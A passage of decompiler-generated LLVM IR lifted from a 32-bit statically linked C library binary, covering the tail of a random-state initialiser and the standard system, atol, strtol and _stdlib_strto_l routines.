  %v6_8053691 = icmp ugt i32 %arg3, 31
  br i1 %v6_8053691, label %dec_label_pc_805369c, label %dec_label_pc_8053693

dec_label_pc_8053693:                             ; preds = %dec_label_pc_805368e
  store i32 0, i32* @ebx, align 4
  %v6_8053698 = icmp ugt i32 %arg3, 7
  br i1 %v6_8053698, label %dec_label_pc_80536a4, label %dec_label_pc_80536f4

dec_label_pc_805369c:                             ; preds = %dec_label_pc_805368e
  %v2_805369c = icmp ult i32 %arg3, 64
  %v1_80536a1 = select i1 %v2_805369c, i32 3, i32 2
  store i32 %v1_80536a1, i32* @ebx, align 4
  br label %dec_label_pc_80536a4

dec_label_pc_80536a4:                             ; preds = %dec_label_pc_8053693, %dec_label_pc_8053682, %dec_label_pc_805369c
  %v0_80536a4 = phi i32 [ 0, %dec_label_pc_8053693 ], [ %v1_8053689, %dec_label_pc_8053682 ], [ %v1_80536a1, %dec_label_pc_805369c ]
  %v1_80536a4 = mul nuw nsw i32 %v0_80536a4, 4
  %v2_80536a4 = add i32 %v1_80536a4, ptrtoint (i32* @global_var_805c154.263 to i32)
  %v3_80536a4 = inttoptr i32 %v2_80536a4 to i32*
  %v4_80536a4 = load i32, i32* %v3_80536a4, align 4
  store i32 %v4_80536a4, i32* %eax.global-to-local, align 4
  %v1_80536ab = add i32 %tmp7, 4
  store i32 %v1_80536ab, i32* @esi, align 4
  %v2_80536ae = add i32 %arg4, 16
  %v3_80536ae = inttoptr i32 %v2_80536ae to i32*
  store i32 %v4_80536a4, i32* %v3_80536ae, align 4
  %v0_80536b1 = load i32, i32* @ebx, align 4
  %v1_80536b1 = mul i32 %v0_80536b1, 4
  %v2_80536b1 = add i32 %v1_80536b1, ptrtoint (i32* @global_var_805c140.264 to i32)
  %v3_80536b1 = inttoptr i32 %v2_80536b1 to i32*
  %v4_80536b1 = load i32, i32* %v3_80536b1, align 4
  store i32 %v4_80536b1, i32* %edx.global-to-local, align 4
  %v0_80536b8 = load i32, i32* @esi, align 4
  %v1_80536b8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80536b8 = mul i32 %v1_80536b8, 4
  %v3_80536b8 = add i32 %v2_80536b8, %v0_80536b8
  store i32 %v3_80536b8, i32* %eax.global-to-local, align 4
  %v1_80536bb = load i32, i32* @edi, align 4
  %v2_80536bb = add i32 %v1_80536bb, 12
  %v3_80536bb = inttoptr i32 %v2_80536bb to i32*
  store i32 %v0_80536b1, i32* %v3_80536bb, align 4
  %v0_80536be = load i32, i32* %edx.global-to-local, align 4
  %v1_80536be = load i32, i32* @edi, align 4
  %v2_80536be = add i32 %v1_80536be, 20
  %v3_80536be = inttoptr i32 %v2_80536be to i32*
  store i32 %v0_80536be, i32* %v3_80536be, align 4
  %v0_80536c1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80536c1 = load i32, i32* @edi, align 4
  %v2_80536c1 = add i32 %v1_80536c1, 24
  %v3_80536c1 = inttoptr i32 %v2_80536c1 to i32*
  store i32 %v0_80536c1, i32* %v3_80536c1, align 4
  %v0_80536c4 = load i32, i32* @esi, align 4
  %v1_80536c4 = load i32, i32* @edi, align 4
  %v2_80536c4 = add i32 %v1_80536c4, 8
  %v3_80536c4 = inttoptr i32 %v2_80536c4 to i32*
  store i32 %v0_80536c4, i32* %v3_80536c4, align 4
  %v0_80536c7 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_80536cc = sext i32 %arg1 to i64
  %v3_80536cc = call i32 @srandom_r(i64 %v2_80536cc, i32 %v0_80536c7)
  %v0_80536d1 = load i32, i32* @ebp, align 4
  %v1_80536d1 = inttoptr i32 %v0_80536d1 to i32*
  store i32 0, i32* %v1_80536d1, align 4
  %v2_80536d8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_80536d8, i32* @ecx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80536dc = load i32, i32* @ebx, align 4
  %v1_80536dc = icmp eq i32 %v0_80536dc, 0
  br i1 %v1_80536dc, label %dec_label_pc_805370d, label %dec_label_pc_80536e0

dec_label_pc_80536e0:                             ; preds = %dec_label_pc_80536a4
  %v0_80536e0 = load i32, i32* @edi, align 4
  %v1_80536e0 = add i32 %v0_80536e0, 4
  %v2_80536e0 = inttoptr i32 %v1_80536e0 to i32*
  %v3_80536e0 = load i32, i32* %v2_80536e0, align 4
  %v1_80536e3 = load i32, i32* @esi, align 4
  %v2_80536e3 = sub i32 %v3_80536e0, %v1_80536e3
  %v2_80536e5 = sdiv i32 %v2_80536e3, 4
  %v3_80536e8 = mul i32 %v2_80536e5, 5
  %v2_80536eb = add i32 %v3_80536e8, %v0_80536dc
  %v1_80536ed = load i32, i32* @ebp, align 4
  %v2_80536ed = inttoptr i32 %v1_80536ed to i32*
  store i32 %v2_80536eb, i32* %v2_80536ed, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805370d

dec_label_pc_80536f4:                             ; preds = %dec_label_pc_8053693
  %v1_80536f4 = call i32 @__errno_location(i32 %v0_805366d)
  store i32 %v1_80536f4, i32* %eax.global-to-local, align 4
  %v1_80536f9 = inttoptr i32 %v1_80536f4 to i32*
  store i32 22, i32* %v1_80536f9, align 4
  %v0_80536ff = load i32, i32* %stack_var_-36, align 4
  %v1_80536ff = call i32 @__errno_location(i32 %v0_80536ff)
  %v1_8053704 = inttoptr i32 %v1_80536ff to i32*
  store i32 22, i32* %v1_8053704, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805370d

dec_label_pc_805370d:                             ; preds = %dec_label_pc_80536a4, %dec_label_pc_80536e0, %dec_label_pc_80536f4
  %v0_8053714 = phi i32 [ 0, %dec_label_pc_80536a4 ], [ 0, %dec_label_pc_80536e0 ], [ -1, %dec_label_pc_80536f4 ]
  store i32 %v0_805366d, i32* @ebx, align 4
  store i32 %v0_805366b, i32* @edi, align 4
  store i32 %v0_805366a, i32* @ebp, align 4
  ret i32 %v0_8053714

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805370d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80536a4, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_8053721 = icmp eq i32 %arg1, 0
  br i1 %v4_8053721, label %dec_label_pc_8053844, label %dec_label_pc_805372c

dec_label_pc_805372c:                             ; preds = %entry
  %v2_8053732 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8053741 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_8053750 = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_8053759 = call i32 @__vfork(i32 %v2_8053750)
  store i32 %v1_8053759, i32* @ebx, align 4
  %v2_8053763 = icmp slt i32 %v1_8053759, 0
  %v2_8053766 = icmp eq i1 %v2_8053763, false
  br i1 %v2_8053766, label %dec_label_pc_8053797, label %dec_label_pc_8053768

dec_label_pc_8053768:                             ; preds = %dec_label_pc_805372c
  %v2_8053770 = call i32 @__bsd_signal(i32 3, i32 %v2_8053732)
  store i32 %v2_8053732, i32* @edx, align 4
  %v2_805377d = call i32 @__bsd_signal(i32 2, i32 %v2_8053741)
  store i32 2, i32* @ebx, align 4
  %v2_805378a = call i32 @__bsd_signal(i32 17, i32 %v2_8053750)
  br label %dec_label_pc_8053841

dec_label_pc_8053797:                             ; preds = %dec_label_pc_805372c
  %v1_8053763 = icmp eq i32 %v1_8053759, 0
  %v1_8053797 = icmp eq i1 %v1_8053763, false
  br i1 %v1_8053797, label %dec_label_pc_80537e3, label %dec_label_pc_8053799

dec_label_pc_8053799:                             ; preds = %dec_label_pc_8053797
  %v2_805379f = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_80537aa = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_80537b5 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_80537d4 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805b503.212 to i32), i32 ptrtoint ([3 x i8]* @global_var_805b508.211 to i32), i32 ptrtoint ([3 x i8]* @global_var_805b500.210 to i32), i32 %arg1, i32 0)
  %v1_80537de = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_80537e3:                             ; preds = %dec_label_pc_8053797
  %v2_80537e9 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_80537f4 = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_80537f9 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8053802 = load i32, i32* @ebx, align 4
  %v7_8053803 = call i32 @wait4(i32 %v0_8053802, i32 %v2_80537f9, i32 0, i32 0)
  %v8_805380b = icmp eq i32 %v7_8053803, -1
  %v1_805380c = icmp eq i1 %v8_805380b, false
  br i1 %v1_805380c, label %dec_label_pc_8053816, label %dec_label_pc_805380e

dec_label_pc_805380e:                             ; preds = %dec_label_pc_80537e3
  store i32 -1, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053816

dec_label_pc_8053816:                             ; preds = %dec_label_pc_80537e3, %dec_label_pc_805380e
  %v2_805381e = call i32 @__bsd_signal(i32 3, i32 %v2_8053732)
  store i32 3, i32* @ecx, align 4
  store i32 %v2_8053732, i32* @ebx, align 4
  %v2_805382b = call i32 @__bsd_signal(i32 2, i32 %v2_8053741)
  store i32 %v2_8053741, i32* @edx, align 4
  %v2_8053838 = call i32 @__bsd_signal(i32 17, i32 %v2_8053750)
  %v3_805383d = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053841

dec_label_pc_8053841:                             ; preds = %dec_label_pc_8053768, %dec_label_pc_8053816
  %storemerge = phi i32 [ -1, %dec_label_pc_8053768 ], [ %v3_805383d, %dec_label_pc_8053816 ]
  br label %dec_label_pc_8053844

dec_label_pc_8053844:                             ; preds = %entry, %dec_label_pc_8053841
  %v0_8053848 = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_8053841 ]
  ret i32 %v0_8053848

; uselistorder directives
  uselistorder i32 %v1_8053759, { 1, 2, 0 }
  uselistorder i32 %v2_8053750, { 1, 0, 2 }
  uselistorder i32 %v2_8053741, { 0, 2, 1 }
  uselistorder i32 %v2_8053732, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 2, 0, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 (i32)* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053844, { 1, 0 }
  uselistorder label %dec_label_pc_8053841, { 1, 0 }
  uselistorder label %dec_label_pc_8053816, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8053857 = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_8053857
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8053871 = inttoptr i32 %arg1 to i8*
  %v5_8053871 = call i32 @_stdlib_strto_l(i8* %v4_8053871, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8053871
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_805387f = load i32, i32* @ebx, align 4
  store i32 %v0_805387f, i32* %stack_var_-16, align 4
  %v0_8053883 = load i32, i32* @global_var_8062a20, align 32
  %v4_8053889 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8053889, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_8053889, i32* %ebx.global-to-local, align 4
  %v2_805389641 = load i8, i8* %arg1, align 1
  %v3_805389642 = sext i8 %v2_805389641 to i32
  store i32 %v3_805389642, i32* %eax.global-to-local, align 4
  %v2_805389943 = mul nsw i32 %v3_805389642, 2
  %v3_805389944 = add i32 %v2_805389943, %v0_8053883
  %v4_805389945 = inttoptr i32 %v3_805389944 to i8*
  %v5_805389946 = load i8, i8* %v4_805389945, align 1
  %v6_805389947 = and i8 %v5_805389946, 32
  %v7_805389948 = icmp eq i8 %v6_805389947, 0
  %v1_805389d49 = icmp eq i1 %v7_805389948, false
  br i1 %v1_805389d49, label %dec_label_pc_8053895, label %dec_label_pc_805389f

dec_label_pc_8053895:                             ; preds = %entry, %dec_label_pc_8053895
  %v0_805389550 = phi i32 [ %v1_8053895, %dec_label_pc_8053895 ], [ %v4_8053889, %entry ]
  %v1_8053895 = add i32 %v0_805389550, 1
  store i32 %v1_8053895, i32* %ebx.global-to-local, align 4
  %v1_8053896 = inttoptr i32 %v1_8053895 to i8*
  %v2_8053896 = load i8, i8* %v1_8053896, align 1
  %v3_8053896 = sext i8 %v2_8053896 to i32
  store i32 %v3_8053896, i32* %eax.global-to-local, align 4
  %v2_8053899 = mul nsw i32 %v3_8053896, 2
  %v3_8053899 = add i32 %v2_8053899, %v0_8053883
  %v4_8053899 = inttoptr i32 %v3_8053899 to i8*
  %v5_8053899 = load i8, i8* %v4_8053899, align 1
  %v6_8053899 = and i8 %v5_8053899, 32
  %v7_8053899 = icmp eq i8 %v6_8053899, 0
  %v1_805389d = icmp eq i1 %v7_8053899, false
  br i1 %v1_805389d, label %dec_label_pc_8053895, label %dec_label_pc_805389f

dec_label_pc_805389f:                             ; preds = %dec_label_pc_8053895, %entry
  %v0_8053895.lcssa = phi i32 [ %v4_8053889, %entry ], [ %v1_8053895, %dec_label_pc_8053895 ]
  %v2_8053896.lcssa = phi i8 [ %v2_805389641, %entry ], [ %v2_8053896, %dec_label_pc_8053895 ]
  %v3_8053896.lcssa = phi i32 [ %v3_805389642, %entry ], [ %v3_8053896, %dec_label_pc_8053895 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_805389f = icmp eq i8 %v2_8053896.lcssa, 43
  br i1 %v9_805389f, label %dec_label_pc_80538b4, label %dec_label_pc_80538a4

dec_label_pc_80538a4:                             ; preds = %dec_label_pc_805389f
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_80538a6 = icmp eq i8 %v2_8053896.lcssa, 45
  %v1_80538a9 = icmp eq i1 %v9_80538a6, false
  br i1 %v1_80538a9, label %dec_label_pc_80538b5, label %dec_label_pc_80538b4

dec_label_pc_80538b4:                             ; preds = %dec_label_pc_805389f, %dec_label_pc_80538a4
  %storemerge3 = phi i32 [ 1, %dec_label_pc_80538a4 ], [ 0, %dec_label_pc_805389f ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_80538b4 = add i32 %v0_8053895.lcssa, 1
  store i32 %v1_80538b4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80538b5

dec_label_pc_80538b5:                             ; preds = %dec_label_pc_80538a4, %dec_label_pc_80538b4
  %v0_80538c7 = phi i32 [ %v0_8053895.lcssa, %dec_label_pc_80538a4 ], [ %v1_80538b4, %dec_label_pc_80538b4 ]
  %v1_80538b7 = and i32 %arg3, -17
  %v2_80538b7 = icmp eq i32 %v1_80538b7, 0
  %v1_80538bd = icmp eq i1 %v2_80538b7, false
  br i1 %v1_80538bd, label %dec_label_pc_80538e3, label %dec_label_pc_80538bf

dec_label_pc_80538bf:                             ; preds = %dec_label_pc_80538b5
  %v1_80538bf = add i32 %arg3, 10
  store i32 %v1_80538bf, i32* %esi.global-to-local, align 4
  %v1_80538c2 = inttoptr i32 %v0_80538c7 to i8*
  %v2_80538c2 = load i8, i8* %v1_80538c2, align 1
  %v8_80538c2 = icmp eq i8 %v2_80538c2, 48
  %v1_80538c5 = icmp eq i1 %v8_80538c2, false
  br i1 %v1_80538c5, label %dec_label_pc_80538d9, label %dec_label_pc_80538c7

dec_label_pc_80538c7:                             ; preds = %dec_label_pc_80538bf
  %v1_80538c7 = add i32 %v0_80538c7, 1
  store i32 %v1_80538c7, i32* %ebx.global-to-local, align 4
  %v1_80538c8 = add i32 %arg3, 8
  store i32 %v1_80538c8, i32* %esi.global-to-local, align 4
  %v1_80538cd = inttoptr i32 %v1_80538c7 to i8*
  %v2_80538cd = load i8, i8* %v1_80538cd, align 1
  %v3_80538cd = zext i8 %v2_80538cd to i32
  %v5_80538cd = and i32 %v3_8053896.lcssa, -256
  %v6_80538cd = or i32 %v5_80538cd, %v3_80538cd
  %v1_80538cf = or i32 %v6_80538cd, 32
  %v3_80538cf = trunc i32 %v1_80538cf to i8
  store i32 %v1_80538cf, i32* %eax.global-to-local, align 4
  %v10_80538d2 = icmp eq i8 %v3_80538cf, 120
  %v1_80538d4 = icmp eq i1 %v10_80538d2, false
  br i1 %v1_80538d4, label %dec_label_pc_80538d9, label %dec_label_pc_80538d6

dec_label_pc_80538d6:                             ; preds = %dec_label_pc_80538c7
  %v2_80538d6 = mul i32 %v1_80538c8, 2
  store i32 %v2_80538d6, i32* %esi.global-to-local, align 4
  %v1_80538d8 = add i32 %v0_80538c7, 2
  store i32 %v1_80538d8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80538d9

dec_label_pc_80538d9:                             ; preds = %dec_label_pc_80538c7, %dec_label_pc_80538bf, %dec_label_pc_80538d6
  %v0_805390212 = phi i32 [ %v1_80538c7, %dec_label_pc_80538c7 ], [ %v0_80538c7, %dec_label_pc_80538bf ], [ %v1_80538d8, %dec_label_pc_80538d6 ]
  %v0_805395920 = phi i32 [ %v1_80538c7, %dec_label_pc_80538c7 ], [ %v4_8053889, %dec_label_pc_80538bf ], [ %v1_80538c7, %dec_label_pc_80538d6 ]
  %v0_80538d9 = phi i32 [ %v1_80538c8, %dec_label_pc_80538c7 ], [ %v1_80538bf, %dec_label_pc_80538bf ], [ %v2_80538d6, %dec_label_pc_80538d6 ]
  %v7_80538dc = icmp sgt i32 %v0_80538d9, 16
  br i1 %v7_80538dc, label %dec_label_pc_80538de, label %dec_label_pc_80538e3

dec_label_pc_80538de:                             ; preds = %dec_label_pc_80538d9
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80538e3

dec_label_pc_80538e3:                             ; preds = %dec_label_pc_80538d9, %dec_label_pc_80538b5, %dec_label_pc_80538de
  %v0_805395921 = phi i32 [ %v0_805395920, %dec_label_pc_80538d9 ], [ %v4_8053889, %dec_label_pc_80538b5 ], [ %v0_805395920, %dec_label_pc_80538de ]
  %v0_805390213 = phi i32 [ %v0_805390212, %dec_label_pc_80538d9 ], [ %v0_80538c7, %dec_label_pc_80538b5 ], [ %v0_805390212, %dec_label_pc_80538de ]
  %v0_80538f2 = phi i32 [ %v0_80538d9, %dec_label_pc_80538d9 ], [ %arg3, %dec_label_pc_80538b5 ], [ 16, %dec_label_pc_80538de ]
  %v1_80538e3 = add i32 %v0_80538f2, -2
  store i32 %v1_80538e3, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_80538eb = icmp ugt i32 %v1_80538e3, 34
  br i1 %v6_80538eb, label %dec_label_pc_805394e, label %dec_label_pc_80538ed

dec_label_pc_80538ed:                             ; preds = %dec_label_pc_80538e3
  %div = udiv i32 -1, %v0_80538f2
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_80538f2
  %v1_80538f4 = trunc i32 %tmp38 to i8
  store i32 0, i32* @edx, align 4
  %v4_805392e = urem i32 %arg4, 256
  br label %dec_label_pc_8053902

dec_label_pc_8053900:                             ; preds = %dec_label_pc_8053944, %dec_label_pc_805392e
  %v4_8053902.pre = phi i32 [ %v1_8053918, %dec_label_pc_8053944 ], [ %v4_8053902.pre.pre, %dec_label_pc_805392e ]
  %v0_8053900 = phi i32 [ %v1_805391f, %dec_label_pc_8053944 ], [ %v0_8053900.pre, %dec_label_pc_805392e ]
  br label %dec_label_pc_8053902

dec_label_pc_8053902:                             ; preds = %dec_label_pc_80538ed, %dec_label_pc_8053900
  %v0_805395919 = phi i32 [ %v0_805395921, %dec_label_pc_80538ed ], [ %v0_8053900, %dec_label_pc_8053900 ]
  %v0_805391f = phi i32 [ %v0_805390213, %dec_label_pc_80538ed ], [ %v0_8053900, %dec_label_pc_8053900 ]
  %v4_8053902 = phi i32 [ %div, %dec_label_pc_80538ed ], [ %v4_8053902.pre, %dec_label_pc_8053900 ]
  %v1_8053902 = inttoptr i32 %v0_805391f to i8*
  %v2_8053902 = load i8, i8* %v1_8053902, align 1
  %v3_8053902 = zext i8 %v2_8053902 to i32
  %v5_8053902 = and i32 %v4_8053902, -256
  %v6_8053902 = or i32 %v3_8053902, %v5_8053902
  store i32 %v6_8053902, i32* %eax.global-to-local, align 4
  %v1_8053904 = add i32 %v6_8053902, -48
  store i32 %v1_8053904, i32* @ecx, align 4
  %v1_8053907 = trunc i32 %v1_8053904 to i8
  %tmp55 = icmp ult i8 %v1_8053907, 10
  br i1 %tmp55, label %dec_label_pc_8053918, label %dec_label_pc_805390c

dec_label_pc_805390c:                             ; preds = %dec_label_pc_8053902
  %v1_805390c = or i32 %v6_8053902, 32
  %v3_805390c = trunc i32 %v1_805390c to i8
  store i32 %v1_805390c, i32* %eax.global-to-local, align 4
  %v1_805390f = and i32 %v1_8053904, -256
  %v2_805390f = or i32 %v1_805390f, 40
  store i32 %v2_805390f, i32* @ecx, align 4
  %tmp56 = icmp ult i8 %v3_805390c, 97
  br i1 %tmp56, label %dec_label_pc_8053918, label %dec_label_pc_8053915

dec_label_pc_8053915:                             ; preds = %dec_label_pc_805390c
  %v1_8053915 = add i32 %v1_805390c, -87
  store i32 %v1_8053915, i32* @ecx, align 4
  br label %dec_label_pc_8053918

dec_label_pc_8053918:                             ; preds = %dec_label_pc_805390c, %dec_label_pc_8053902, %dec_label_pc_8053915
  %v0_8053947 = phi i32 [ %v2_805390f, %dec_label_pc_805390c ], [ %v1_8053904, %dec_label_pc_8053902 ], [ %v1_8053915, %dec_label_pc_8053915 ]
  %v1_8053918 = urem i32 %v0_8053947, 256
  store i32 %v1_8053918, i32* %eax.global-to-local, align 4
  %v1_805391b = load i32, i32* %esi.global-to-local, align 4
  %v2_805391b = sub i32 %v1_8053918, %v1_805391b
  %v10_805391b = and i32 %v2_805391b, %v1_805391b
  %v11_805391b = icmp slt i32 %v10_805391b, 0
  %v13_805391b = icmp slt i32 %v2_805391b, 0
  %v2_805391d = icmp eq i1 %v13_805391b, %v11_805391b
  br i1 %v2_805391d, label %dec_label_pc_805394e, label %dec_label_pc_805391f

dec_label_pc_805391f:                             ; preds = %dec_label_pc_8053918
  %v1_805391f = add i32 %v0_805391f, 1
  store i32 %v1_805391f, i32* %ebx.global-to-local, align 4
  %v0_8053920 = load i32, i32* @edx, align 4
  %tmp = icmp ugt i32 %v0_8053920, %div
  br i1 %tmp, label %dec_label_pc_805392e, label %dec_label_pc_8053926

dec_label_pc_8053926:                             ; preds = %dec_label_pc_805391f
  %v15_8053920 = icmp eq i32 %v0_8053920, %div
  %v1_8053926 = icmp eq i1 %v15_8053920, false
  br i1 %v1_8053926, label %dec_label_pc_8053944, label %dec_label_pc_8053928

dec_label_pc_8053928:                             ; preds = %dec_label_pc_8053926
  %v1_8053928 = trunc i32 %v0_8053947 to i8
  %tmp57 = icmp ugt i8 %v1_8053928, %v1_80538f4
  br i1 %tmp57, label %dec_label_pc_805392e, label %dec_label_pc_8053944

dec_label_pc_805392e:                             ; preds = %dec_label_pc_8053928, %dec_label_pc_805391f
  store i32 %v4_805392e, i32* %eax.global-to-local, align 4
  %v0_8053932 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053932 = and i32 %v0_8053932, %v4_805392e
  store i32 %v2_8053932, i32* %ebp.global-to-local, align 4
  %v1_8053934 = call i32 @__errno_location(i32 %div)
  store i32 %v1_8053934, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_805393c = inttoptr i32 %v1_8053934 to i32*
  store i32 34, i32* %v1_805393c, align 4
  %v0_8053900.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8053902.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053900

dec_label_pc_8053944:                             ; preds = %dec_label_pc_8053928, %dec_label_pc_8053926
  %v4_8053944 = mul i32 %v0_8053920, %v1_805391b
  store i32 %v1_8053918, i32* %eax.global-to-local, align 4
  %v2_805394a = add i32 %v4_8053944, %v1_8053918
  store i32 %v2_805394a, i32* @edx, align 4
  br label %dec_label_pc_8053900

dec_label_pc_805394e:                             ; preds = %dec_label_pc_8053918, %dec_label_pc_80538e3
  %v0_8053959 = phi i32 [ %v0_805395921, %dec_label_pc_80538e3 ], [ %v0_805395919, %dec_label_pc_8053918 ]
  %stack_var_-24.0 = phi i32 [ %tmp27, %dec_label_pc_80538e3 ], [ %div, %dec_label_pc_8053918 ]
  %v4_805394e = icmp eq i32 %arg2, 0
  br i1 %v4_805394e, label %dec_label_pc_805395b, label %dec_label_pc_8053955

dec_label_pc_8053955:                             ; preds = %dec_label_pc_805394e
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8053959 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8053959, i32* %v2_8053959, align 4
  br label %dec_label_pc_805395b

dec_label_pc_805395b:                             ; preds = %dec_label_pc_805394e, %dec_label_pc_8053955
  %v0_805395b = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_805395b, i32* %eax.global-to-local, align 4
  %v1_805395d = trunc i32 %v0_805395b to i8
  %v6_805395d = icmp eq i8 %v1_805395d, 0
  %v2_805395f = zext i1 %v6_805395d to i32
  %v1_80539614 = or i32 %v2_805395f, -2147483648
  store i32 %v1_80539614, i32* %ebx.global-to-local, align 4
  %v5_8053967 = icmp eq i8 %tmp37, 0
  br i1 %v5_8053967, label %dec_label_pc_805397f, label %dec_label_pc_805396e

dec_label_pc_805396e:                             ; preds = %dec_label_pc_805395b
  %v0_805396e = load i32, i32* @edx, align 4
  %tmp58 = icmp ugt i32 %v0_805396e, %v1_80539614
  br i1 %tmp58, label %dec_label_pc_8053972, label %dec_label_pc_805397f

dec_label_pc_8053972:                             ; preds = %dec_label_pc_805396e
  %v1_8053972 = call i32 @__errno_location(i32 %stack_var_-24.0)
  store i32 %v1_8053972, i32* %eax.global-to-local, align 4
  %v0_8053977 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053977, i32* @edx, align 4
  %v1_8053979 = inttoptr i32 %v1_8053972 to i32*
  store i32 34, i32* %v1_8053979, align 4
  %v0_805397f.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805397f

dec_label_pc_805397f:                             ; preds = %dec_label_pc_805396e, %dec_label_pc_805395b, %dec_label_pc_8053972
  %v0_805397f = phi i32 [ %v0_805395b, %dec_label_pc_805396e ], [ %v0_805395b, %dec_label_pc_805395b ], [ %v0_805397f.pre, %dec_label_pc_8053972 ]
  store i32 %v0_805397f, i32* %eax.global-to-local, align 4
  %v3_8053981 = trunc i32 %v0_805397f to i8
  %v4_8053981 = icmp eq i8 %v3_8053981, 0
  %v0_805398a.pre = load i32, i32* @edx, align 4
  br i1 %v4_8053981, label %dec_label_pc_8053987, label %dec_label_pc_8053985

dec_label_pc_8053985:                             ; preds = %dec_label_pc_805397f
  %v1_8053985 = sub i32 0, %v0_805398a.pre
  store i32 %v1_8053985, i32* @edx, align 4
  br label %dec_label_pc_8053987

dec_label_pc_8053987:                             ; preds = %dec_label_pc_805397f, %dec_label_pc_8053985
  %v0_805398a = phi i32 [ %v1_8053985, %dec_label_pc_8053985 ], [ %v0_805398a.pre, %dec_label_pc_805397f ]
  store i32 %v0_805398a, i32* %eax.global-to-local, align 4
  %v2_805398c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805398c, i32* @ebx, align 4
  ret i32 %v0_805398a

; uselistorder directives
  uselistorder i32 %v0_805398a, { 1, 0 }
  uselistorder i32 %v0_805397f, { 1, 0 }
  uselistorder i32 %v0_8053920, { 2, 1, 0 }
  uselistorder i32 %v1_805391f, { 1, 0 }
  uselistorder i32 %v2_805391b, { 1, 0 }
  uselistorder i32 %v1_8053918, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8053947, { 1, 0 }
  uselistorder i32 %v0_8053900, { 1, 0 }
  uselistorder i32 %v4_805392e, { 1, 0 }
  uselistorder i32 %div, { 2, 4, 1, 0, 3, 5 }
  uselistorder i32 %v0_80538f2, { 1, 0, 2 }
  uselistorder i32 %v2_80538d6, { 1, 0 }
  uselistorder i32 %v1_80538cf, { 1, 0 }
  uselistorder i32 %v1_80538c8, { 1, 0, 2 }
  uselistorder i32 %v0_80538c7, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_8053896.lcssa, { 1, 0 }
  uselistorder i32 %v0_8053895.lcssa, { 1, 0 }
  uselistorder i32 %v1_8053895, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8053889, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_8053883, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 4, 2, 0, 3, 5, 1 }
